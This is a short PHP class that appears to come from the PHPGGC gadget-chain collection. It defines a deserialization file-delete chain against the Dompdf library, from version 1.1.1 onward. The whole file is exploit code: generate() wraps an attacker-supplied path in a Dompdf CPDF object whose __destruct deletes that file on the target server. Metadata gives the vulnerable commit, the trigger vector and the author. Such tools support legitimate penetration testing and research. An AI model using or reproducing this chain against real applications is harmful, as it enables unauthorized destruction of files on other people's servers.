<?php

namespace GadgetChain\Dompdf;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '1.1.1 <= ?';
    public static $vector = '__destruct';
    public static $author = 'coiffeur';
    public static $information = '
        Note that some files may not be removed (depends on permissions).
        Target versions: commit a13af8d4bdab280bf8c48dbc23a4d51cac6af202, 1 Dec 2021 (~v1.1.1) <= exploitable
    ';

    public function generate(array $parameters)
    {
        return new \Dompdf\CPDF($parameters['remote_path']);
    }
}
